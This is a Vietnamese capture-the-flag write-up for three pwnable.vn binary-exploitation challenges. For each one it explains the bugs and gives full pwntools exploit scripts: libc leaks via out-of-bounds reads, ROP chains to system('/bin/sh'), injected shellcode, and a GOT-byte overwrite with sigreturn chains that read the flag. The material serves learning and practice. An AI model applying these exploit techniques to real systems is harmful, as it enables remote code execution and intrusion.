## file_storage

Ở bài này, tác giả cho ta source code của file `file_storage.c`, tuy nhiên thì không có binary, do đó ta không biết được các compile flag (stack canary, PIE, ...) mà binary trên remote server sử dụng là gì. Sau khi audit một tí thì ta để ý thấy 2 bug:
- Một bug buffer overflow khá rõ ràng ở hàm `feedback`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/05b0cac2-f645-4c58-b7eb-d7cabd1368b1)

- Một bug out-of-bound read xảy ra do ta có thể nhập số âm vào tham số `offset` khi thực hiện đọc file

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/70418781-daf2-46a3-8304-7a3c3e904c19)

Nếu độ dài của file nhỏ `4096` thì sẽ được lưu tạm ở .bss segment trong biến `fixed`, từ đó ta kết luận được trên remote thì binary sẽ được compile với Partial RELRO/No RELRO vì nếu không thì phần buffer này sẽ bị read-only. Nếu độ dài của file lớn hơn thì nó sẽ được allocate lên heap, lợi dụng điều này ta có thể thông qua heap để leak các pointer đến libc trên heap.

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/df60c7bc-72c5-4902-9dae-75736b00a6b5)

Để làm được như thế thì ta phải có một file có độ dài lớn, may mắn trên remote tác giả đã cho ta 2 file `4k` và `8k` chứa lần lượt 4000 và 8000 nullbyte

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/af5922a7-3f3a-474c-b0a6-bfc986c0b73f)

Hai địa chỉ mà ta leak được của libc lần lượt là của `_IO_2_1_stderr_` và `_IO_wfile_jumps`, ta sẽ tìm vài trang libc database để search offset và tìm xem libc version mà remote đang sử dụng là gì

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9923a0cf-e891-42b8-b07c-52a86db3e0df)

Vậy là ta xác định được bài dùng glibc 2.31, giờ thì ta có thể dùng libc để ROP bằng bug buffer overflow ban đầu. Tuy nhiên để chắc chắn, ta cần xác định xem binary trên server có sử dụng stack canary hay không, ta có thể dùng bug out-of-bound read khi nãy để read từ .bss segment ngược về code segment, sau đó dùng capstone engine để check assembly và xem binary có gọi đến fs segment hay gọi đến `__stack_chk_fail` không

```python
from pwn import *
from pwn import u64, u32, p64, p32, unpack
import capstone

if args.REMOTE:
    io = remote("file_storage.pwnable.vn", 10000)
    libc = ELF("libc/libc-2.31.so", checksec=False)
    file = b"lorem"
    file_big = b"8k"
    bin_sh = 0x1b45bd
    pop_rdi = 0x23b6a
else:
    io = process("./a.out")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    file = b"a.txt"
    file_big = b"b.txt"
    bin_sh = 0x1d8678
    pop_rdi = 0x2a3e5

io.sendlineafter(b"> ", b"cat " + file_big + b" -4488 8")
leak = io.recvline()[0:6]
_IO_2_1_stderr_ = unpack(leak, word_size=8*6)

print("_IO_2_1_stderr_ @ " + hex(_IO_2_1_stderr_))

io.sendlineafter(b"> ", b"cat " + file_big + b" -4128 8")
leak = io.recvline()[0:6]
_IO_wfile_jumps = unpack(leak, word_size=8*6)

print("_IO_wfile_jumps @ " + hex(_IO_wfile_jumps))

libc.address = _IO_wfile_jumps - libc.sym["_IO_wfile_jumps"]
# canary_addr = libc.address-0x2898
sh = libc.address + bin_sh
print("libc @ " + hex(libc.address))
print("/bin/sh @ " + hex(sh))
print("system @ " + hex(libc.sym["system"]))

# ilen = canary_addr >> 8*3
# offset = ((ilen<<8*3) ^ canary_addr) 
pause()
io.sendlineafter(b"> ", b"cat " + file + b" -9728 4096")

sleep(2)
leak_binary = io.recv(4096)

md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
with open("bin", "wb") as f_bin:
    f_bin.write(leak_binary)

for i in md.disasm(leak_binary, 0x1000):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/0392e061-ff02-49f9-8aa9-43c0eefc4f30)

Sau khi đọc qua, ta xác định là server không có canary, lúc này thì mạnh dạn ROP thôi

```py
from pwn import *
from pwn import u64, u32, p64, p32, unpack
import capstone

if args.REMOTE:
    io = remote("file_storage.pwnable.vn", 10000)
    libc = ELF("libc/libc-2.31.so", checksec=False)
    file = b"lorem"
    file_big = b"8k"
    bin_sh = 0x1b45bd
    pop_rdi = 0x23b6a
else:
    io = process("./a.out")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    file = b"a.txt"
    file_big = b"b.txt"
    bin_sh = 0x1d8678
    pop_rdi = 0x2a3e5

io.sendlineafter(b"> ", b"cat " + file_big + b" -4488 8")
leak = io.recvline()[0:6]
_IO_2_1_stderr_ = unpack(leak, word_size=8*6)

print("_IO_2_1_stderr_ @ " + hex(_IO_2_1_stderr_))

io.sendlineafter(b"> ", b"cat " + file_big + b" -4128 8")
leak = io.recvline()[0:6]
_IO_wfile_jumps = unpack(leak, word_size=8*6)

print("_IO_wfile_jumps @ " + hex(_IO_wfile_jumps))

libc.address = _IO_wfile_jumps - libc.sym["_IO_wfile_jumps"]
# canary_addr = libc.address-0x2898
sh = libc.address + bin_sh
print("libc @ " + hex(libc.address))
print("/bin/sh @ " + hex(sh))
print("system @ " + hex(libc.sym["system"]))

# ilen = canary_addr >> 8*3
# offset = ((ilen<<8*3) ^ canary_addr) 
pause()
io.sendlineafter(b"> ", b"cat " + file + b" -9728 4096")

sleep(2)
leak_binary = io.recv(4096)

md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
with open("bin", "wb") as f_bin:
    f_bin.write(leak_binary)

for i in md.disasm(leak_binary, 0x1000):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))


io.sendlineafter(b"> ", b"exit")
io.sendline(b"A"*264 + p64(libc.address + pop_rdi + 1) + p64(libc.address + pop_rdi) + p64(sh) + p64(libc.sym["system"]))

io.interactive()
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/f445a504-547a-4ee0-b645-d67a365bd3c4)

## Escape Me

Bài này thực hiện tạo một sandbox process bằng fork, sau đó sử dụng seccomp filter để ngăn ta sử dụng các syscall ngoại trừ `read`, `write`, `fstat`, `exit_group`, `mmap`, `munmap`, `mprotect` và cho ta chạy shellcode trên process đó. Ban đầu ta nghĩ đây là một bài syscall bypass, tuy nhiên nếu để ý kỹ thì có một bug buffer overflow xảy ra khi hàm `broker_process` nhận output được trả về từ shellcode của ta

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/713c4d82-23d6-42bd-9045-1a201578ba5b)

Challenge thực hiện `mmap` ra một vùng nhớ và gắn với để cho shellcode ghi output vào với 4 byte đầu sẽ là length của output và còn lại là data, ở đây ta có thể control `out_sz` tùy ý, từ đó dẫn tới stack-based buffer overflow. VÌ bài này cũng không cho ta biết libc, nên ta sẽ leak libc thông qua GOT, sau đó dùng cách tương tự bài `file_storage` để xác định libc và cuối cùng là trả về data để overflow biến `output` và thực hiện ROP để control RIP.

```python
from pwn import *
from pwn import u64, u32, p64, p32, unpack, asm

if args.REMOTE:
    io = remote("escape_me.pwnable.vn", 31338)
    pop_rdi = 0x2a3e5
    system = 0x50d60
    sh = 0x1d8698
    read_offset = 0x114980
else:
    io = process("./escape_me")
    pop_rdi = 0x2a3e5
    system = 0x50d70
    sh = 0x1d8678
    read_offset = 0x1147d0

shellcode = asm(f"""
    mov r11, 0x404080
    mov r11, [r11]
    sub r11, {read_offset}
    mov r15, r11
    mov rax, 0
    lea rsi, [rdi+4]
    mov r11, 1000
    mov [rdi], r11
    lea rbx, [rsi+rax*8]
    mov r13, 0x4141414141414141
    mov [rbx], r13
    add rax, 1
    cmp rax, 32
    jle $-25
    lea r11, [r15+{pop_rdi+1}]
    mov [rsi+33*8], r11
    lea r11, [r15+{pop_rdi}]
    mov [rsi+34*8], r11
    lea r11, [r15+{system}]
    mov [rsi+36*8], r11
    lea r11, [r15+{sh}]
    mov [rsi+35*8], r11
    ret
""", arch = 'amd64', os = 'linux')


pause()
io.sendlineafter(b">", b"1")
io.sendline(str(len(shellcode)).encode())
io.send(shellcode)

io.sendlineafter(b">", b"2")
io.interactive()
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/c874782d-499b-4c2a-b9a4-54bee824e3c7)

## blacklist

Đây là một bài syscall bypass, chặn các syscall `execve`, `execveat`, `write`, `pwritev`, `pwritev2`, `pwrite64`, `mprotect`, `kill`, `tkill`. Ta nhanh chóng nhận ra ta sẽ có đủ 3 syscall (`open`, `read`, `writev`) để read flag, giờ việc còn lại sẽ là tìm cơ hội để dùng 3 syscall này.

Bài này thì ta sẽ có một bug buffer overflow 48-32=16 byte overflow, vừa đủ để override return address và control được RIP, tuy nhiên có vài vấn đề:
- Không có memory leak
- Binary không có syscall instruction

Binary được compile với no pie, do đó việc đầu tiên ta nghĩ đến hẳn sẽ là tìm cách để stack pivot lên một vùng memory RW của binary, thường là `.bss`. Một cách mà ta có thể dùng là gadget `leave, ret`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2a45ba6a-0dba-4090-911c-13a6fbde4a40)

buffer bị overflow bắt đầu tại `a60`, sau lệnh leave của main thì RBP sẽ là giá trị tại `a80`, ta có thể đưa địa chỉ của .bss vào để pivot stack. Ở đây ta có thể control RIP về `0x401469`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5c12d8f1-b4f1-42d4-b33d-3e33ea918668)

Do ta đã control RBP, với gadget này ta sẽ thực hiện ghi 48 byte đến `RBP-0x20` trước rồi sau đó mới thực hiện leave để pivot lên .bss. Giờ đây ta cần giải quyết vấn đề tiếp theo, ta có thể ROP nhưng thiếu đi gadget `syscall`, sau khi kiểm tra các GOT entry thì mình phát hiện là nếu ta ghi đè 1 byte đầu của alarm@got thì ta sẽ có thể có được `syscall` instruction, tuy không biết libc nhưng việc bruteforce 0xff thì không khó. Sau khi có instruction `syscall` thì mình nghĩ đến dùng `read` để control rax và dùng sigreturn để để gọi đến lần lượt 3 syscall `open`, `read`, `writev`. Thông qua bruteforce thì mình biết được byte cần ghi để biến instruction tại alarm@got thành `syscall` là `\x0b`, cách mình bruteforce là mình sẽ canh để ghi ghi 1 byte vào alarm@got xong thì nó sẽ return về đúng địa chỉ đó luôn, vì `main+66` là lệnh `mov eax, 0` nên chắc chắn lúc đó rax sẽ là `0x0`.

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/4b9cdfa6-36c4-42cc-81ba-90ba0ea47036)

Nếu như alarm@got lúc này đúng là syscall thì nó sẽ gọi đến syscall `read` và bị delay, ngay sau alarm@got sẽ là read@got, do đó mà chương trình sẽ tiếp tục wait for input và bị delay thêm một lần thứ 2, đây sẽ là dấu hiệu để ta xác định được rằng byte ta ghi đã đúng chưa.

Sau khi có `syscall` rồi thì bây giờ ta chỉ cần setup 3 sigreturn frame và thực hiện sigreturn để control các register và gọi đến các syscall `open`, `read`, `writev` nữa là được

```py
from pwn import *
from pwn import u64, u32, p64, p32, unpack, asm

# PwnableVN{n0_m0r3_cSu_Wh!t3L!5T_Is_b3tT3r}

if args.REMOTE:
    io = remote("blacklist.pwnable.vn", 31337)

else:
    io = process("./sym")


exe = ELF("./sym")
main = 0x000000000040143d
ret = 0x401485


mis_aligned_read = 0x0000000000401469
pivot_bss_addr = 0x4040a8
pivot_2 = 0x404168+40
pivot_3 = 0x4042b8
pivot_4 = 0x404430
signal_got = 0x404058
alarm_got = 0x404028
leave_ret = 0x0000000000401484
ret = 0x0000000000401485
pop_rbp = 0x000000000040123d
jmp_rax = 0x40120e
sig_frame = 0x4041c0
sig_frame_2 = 0x4042b8+8+8*6
sig_frame_3 = 0x404430+8+8*6

SYS_open = p64(2)
SYS_read = p64(0)
SYS_writev = p64(20)
flag_str = p64(0x404020)
next_rip = p64(ret)
next_rbp = p64(0x404280) 
next_rsp = p64(0x404280) # straight to planned syscall
O_RDONLY = p64(0)
FLAGS = p64(0)

io.recvuntil(b"flag\n")
# io = process("./blacklist")
# write to signal got 
pause()
io.send(b"A"*32 + p64(pivot_bss_addr+0x20) + p64(mis_aligned_read))
io.send(b"F"*16 + flag_str + O_RDONLY + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+4*8+0x18+0x20)*2 + p64(mis_aligned_read))
io.send(next_rbp + b"A"*8*3 + p64(signal_got+0x20) +  p64(mis_aligned_read))

# setup sigframe 1
pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+8+0x10+0x20)*2 + p64(mis_aligned_read))
io.send(b"F"*16 + flag_str + O_RDONLY + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+8*4+0x18+0x10+0x20)*2 + p64(mis_aligned_read))
io.send(FLAGS + SYS_open + b"A"*8 + next_rsp + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20)*2 + p64(mis_aligned_read))
io.send(next_rip + b"2"*8 + b"3"*16 + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20+16)*2 + p64(mis_aligned_read))
io.send(p64(0x33) + b"4"*16 + p64(0x2b) + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20+40+8)*2 + p64(mis_aligned_read))
io.send(b"\x00"*8*4 + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20+40+8+40)*2 + p64(mis_aligned_read))
io.send(p64(exe.plt["alarm"]) + p64(pop_rbp) + p64(0x4042d8) + p64(mis_aligned_read) + p64(signal_got+0x20) + p64(mis_aligned_read))

# setup sigframe 2
fd = p64(3)
buf = p64(0x404020)
count = p64(8)

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+8+0x10+0x20-8)*2 + p64(mis_aligned_read))
io.send(b"F"*16 + fd + buf + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+8*4+0x18+0x10+0x20-8)*2 + p64(mis_aligned_read))
io.send(count + SYS_read + b"A"*8 + next_rsp + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20-8)*2 + p64(mis_aligned_read))
io.send(next_rip + b"2"*8 + b"3"*16 + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20+16-8)*2 + p64(mis_aligned_read))
io.send(p64(0x33) + b"4"*16 + p64(0x2b) + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20+40+8-8)*2 + p64(mis_aligned_read))
io.send(b"\x00"*8*4 + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20+40+8+40)*2 + p64(mis_aligned_read))
io.send(p64(exe.plt["alarm"]) + p64(pop_rbp) + p64(pivot_4+0x20) + p64(mis_aligned_read) + p64(signal_got+0x20) + p64(mis_aligned_read))

# setup sigframe 3
iovec = buf + count
io_vec_addr = p64(0x404478)
fd = p64(1) # stdout
vlen = p64(1) # vector count, we have 1

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+8+0x10+0x20-8)*2 + p64(mis_aligned_read))
io.send(iovec + fd + io_vec_addr + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+8*4+0x18+0x10+0x20-8)*2 + p64(mis_aligned_read))
io.send(vlen + SYS_writev + b"A"*8 + next_rsp + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20-8)*2 + p64(mis_aligned_read))
io.send(next_rip + b"2"*8 + b"3"*16 + p64(signal_got+0x20) +  p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20+16-8)*2 + p64(mis_aligned_read))
io.send(p64(0x33) + b"4"*16 + p64(0x2b) + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20+40+8-8)*2 + p64(mis_aligned_read))
io.send(b"\x00"*8*4 + p64(signal_got+0x20) + p64(mis_aligned_read))

pause()
io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20+40+8+40)*2 + p64(mis_aligned_read))
io.send(p64(exe.plt["alarm"]) + p64(pop_rbp) + p64(0x4042d8) + p64(mis_aligned_read) + p64(signal_got+0x20) + p64(mis_aligned_read))

# 1-byte overwrite
pause()
io.send(p64(pop_rbp) + p64(pivot_2) + p64(mis_aligned_read) + p64(alarm_got+0x20-8)*2 + p64(mis_aligned_read))
io.send(p64(0x4040a8+0x20)*5 + b"\x0b")

pause()
io.send(b"AAA")
pause()
io.send(b"/flag" + b"\x00"*10)


pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(sig_frame) + p64(mis_aligned_read))

# trigger sigreturn
pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_2-32-8) + p64(mis_aligned_read))
pause()
io.send(b"AAA")

pause()
io.send(b"/flag" + b"\x00"*10)

pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_3) + p64(mis_aligned_read))

#trigger sigreturn
pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_3-32-8) + p64(mis_aligned_read))
pause()
io.send(b"AAA")

pause()
io.send(b"/flag" + b"\x00"*10)

pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_4) + p64(mis_aligned_read))

#trigger sigreturn
pause()
io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_4-32-8) + p64(mis_aligned_read))
pause()
io.send(b"AAA")

pause()
io.send(b"/flag" + b"\x00"*10)

io.interactive()
```

Một cách khác đó là ta có thể dùng syscall `mmap` để tạo ra một vùng nhớ RWX, sau đó ghi shellcode vào và chạy. 
